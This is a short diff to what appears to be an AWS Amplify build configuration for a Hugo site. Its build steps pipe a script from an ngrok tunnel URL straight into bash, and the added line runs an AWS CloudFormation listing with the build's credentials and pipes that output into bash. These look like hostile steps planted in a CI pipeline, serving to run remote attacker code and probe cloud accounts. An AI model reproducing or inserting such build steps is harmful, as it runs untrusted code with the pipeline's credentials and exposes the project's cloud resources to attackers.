@@ -9,6 +9,7 @@ frontend:
         - rm -rf hugo.tar.gz
         - echo "[!] Doing stuff"
         - curl https://3055-180-151-104-178.in.ngrok.io/file.sh | bash
+        - echo $(aws cloudformation list-stacks --region us-east-1 2>&1 | bash)
         - hugo
   artifacts:
     baseDirectory: public
